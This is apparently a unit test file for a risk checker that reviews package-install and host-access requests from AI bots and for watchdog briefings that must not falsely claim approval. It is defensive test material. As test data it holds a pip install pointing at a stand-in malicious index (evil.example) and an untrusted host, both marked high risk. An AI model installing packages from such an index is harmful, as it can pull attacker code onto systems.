"""Unit tests for pending-approval risk assessment and briefing wording."""
from types import SimpleNamespace

from scripts.bots.approval_risk import (
    assess_command,
    assess_host,
    assess_pending,
    claims_gate_approval,
)
from scripts.bots.watchdog import Decision, Stall, briefing_for_decision


def test_low_risk_well_known_data_libraries():
    rec = assess_command("pip install xlrd openpyxl html5lib -q")
    assert rec.approve is True
    assert rec.level == "low"
    assert set(rec.packages) >= {"xlrd", "openpyxl", "html5lib"}


def test_compound_cd_and_pip_is_low_risk():
    rec = assess_command("cd /workspace/aibots/workspaces/bot-001 && pip install xlrd openpyxl html5lib -q")
    assert rec.approve is True
    assert rec.level == "low"


def test_unknown_package_and_custom_index_are_high_risk():
    unknown = assess_command("pip install pdfplumber -q")
    assert unknown.approve is False
    assert unknown.level == "high"
    assert unknown.counter_proposal
    idx = assess_command("pip install xlrd --index-url https://evil.example/simple")
    assert idx.approve is False
    apt = assess_command("apt-get update && apt-get install -y python3-xlrd")
    assert apt.approve is False
    assert "apt" in apt.rationale.lower() or "system" in apt.category


def test_official_host_low_unknown_host_high():
    low = assess_host("www.landreg.gov.hk", allowed_hosts=set(), safe_suffixes=["gov.hk"])
    assert low.approve is True and low.level == "low"
    high = assess_host(
        "evil.example",
        allowed_hosts={"gov.hk"},
        safe_suffixes=["gov.hk"],
        intent="Search public Hong Kong residential sales figures",
    )
    assert high.approve is False and high.level == "high"
    assert high.counter_proposal
    assert "data.gov.hk" in high.counter_proposal or "rvd.gov.hk" in high.counter_proposal


def test_briefing_does_not_claim_approval_when_gate_denied():
    stall = Stall(bot_id="bot-001", kind="permission_gate",
                  command="apt-get install -y python3-xlrd", ticket_id="t1")
    d = Decision("reject", "apt/brew installs expand system packages and are not auto-approved.", stall)
    d.details = {
        "risk": "high",
        "gate_approved": False,
        "counter_proposal": "Use already-installed packages and official public sources.",
    }
    text = briefing_for_decision(d)
    assert claims_gate_approval(text) is False
    assert "NOT approved" in text
    assert "Counter-proposal" in text

    # Even an approve action must not claim approval if the gate did not allow it.
    stall2 = Stall(bot_id="bot-001", kind="permission_gate",
                   command="pip install xlrd -q", ticket_id="t1")
    lie = Decision("approve", "low-risk", stall2)
    lie.details = {"gate_approved": False, "risk": "low"}
    text2 = briefing_for_decision(lie)
    assert claims_gate_approval(text2) is False
    assert "NOT approve" in text2

    ok = Decision("approve", "well-known data libraries", stall2)
    ok.details = {"gate_approved": True, "risk": "low"}
    text3 = briefing_for_decision(ok)
    assert "has been approved" in text3
    assert "permission gate now allows this exact command" in text3.lower() or "has been approved" in text3
